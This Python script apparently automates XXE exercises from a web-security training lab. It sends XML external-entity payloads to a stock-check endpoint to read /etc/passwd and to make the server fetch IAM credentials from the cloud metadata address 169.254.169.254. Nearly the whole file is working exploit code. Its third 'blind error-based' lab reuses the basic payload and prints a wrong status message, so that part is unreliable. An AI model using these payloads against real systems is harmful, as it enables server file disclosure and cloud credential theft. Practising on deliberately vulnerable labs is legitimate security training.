from utilities import *


class XXEVulnerability:
    def __init__(self, base_url):
        # assign base URL for all lab scenarios
        self.base_url = base_url
        self.path = '/product/stock'
        self.verify = ['/home/carlos','/root:/bin/bash','SecretAccessKey','Token']
        self.header = {'Content-Type': 'application/xml'}
        self.response = None
    
    def retrieve_external_file(self):
        '''
         Lab 1: Exploiting XXE using external entities to retrieve files
        '''
        xml_payload = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'''

        print("{}\nRetrieving /etc/password file..\n{}".format(textcolor.DANGER, textcolor.ENDC))
        self.response = http_request(self.base_url, self.path, [xml_payload, self.header]).text
        return 1 if any(w in self.response for w in self.verify) else 0

    def xxe2ssrf(self):
        '''
         Lab 2: Exploiting XXE to perform SSRF attacks
        '''
        xml_payload = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'''
        
        print("{}\nAccessing 169.254.169.254..\n{}".format(textcolor.DANGER, textcolor.ENDC))
        self.response = http_request(self.base_url, self.path, [xml_payload, self.header]).text
        return 1 if any(w in self.response for w in self.verify) else 0

    def blind_xxe_error(self):
        '''
         Lab 3: Exploiting XXE using external entities to retrieve files
        '''

        xml_payload = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'''
        
        print("{}\nAccessing 169.254.169.254..\n{}".format(textcolor.DANGER, textcolor.ENDC))
        self.response = http_request(self.base_url, self.path, [xml_payload, self.header]).text
        return 1 if any(w in self.response for w in self.verify) else 0
    
        pass

def handle_choice(number, instance):
    '''
    This function is used to handle different user input choices that 
    executes different lab exercises with their respective payloads
    '''
    if number == 1:
        if instance.retrieve_external_file():
            print(append_colors("\n/etc/passwd retrieved successfully\n",textcolor.OKGREEN))
            highlight_text(instance.response, instance.verify)

    elif number == 2:  
        if instance.xxe2ssrf():
            print(append_colors("Remote Server data accessed successfully\n",textcolor.OKGREEN))
            highlight_text(instance.response, instance.verify)

    elif number == 3:
        if instance.blind_xxe_error():
            print(append_colors("XML external entity error retrieved successfully\n",textcolor.OKGREEN))
            highlight_text(instance.response, instance.verify)

    else:
        print(append_colors("\nInvalid choice.",textcolor.DANGER))

def main():

    data = [
        ["(1)", "Exploiting XXE using external entities to retrieve files"],
        ["(2)", "Exploiting XXE to perform SSRF attacks"],
        ["(3)", "Exploiting blind XXE to retrieve data via error messages"]
    ]

    choice, url = get_input(data)

    if(choice > 0):

        # instance of XXEVulnerability
        instanceVar = XXEVulnerability(url)

        try:
            handle_choice(int(choice), instanceVar)
            pass
        except:
            print("{}\nInvalid Input{}\n".format(textcolor.DANGER, textcolor.ENDC))
            pass
        
        pass

if __name__ == '__main__':
    main()